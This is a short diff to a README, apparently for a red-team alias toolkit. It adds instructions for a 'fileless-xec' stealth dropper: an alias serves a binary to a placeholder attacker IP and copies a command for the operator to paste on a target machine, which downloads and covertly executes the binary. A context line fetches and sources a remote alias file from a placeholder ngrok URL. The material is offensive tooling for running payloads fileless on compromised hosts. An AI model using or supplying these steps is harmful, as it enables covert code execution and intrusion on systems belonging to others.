@@ -57,6 +57,14 @@ curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/ali
 
 ## `fileless-xec`
 
+### Exec binary from a local HTTP server
+
+This will launch an http server (to serve the local binary) and copy the `fileless-xec` command to paste on target machine:
+```
+bang.flx.client.cpy [ATTACKER_IP] [TARGET_PORT] [BINARY_NAME]
+```
+Now paste the command on target machine (to dl binary and stealthy execute it)
+
 ### Copy line to launch `fieleless-xec` stealth dropper
 
 This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)
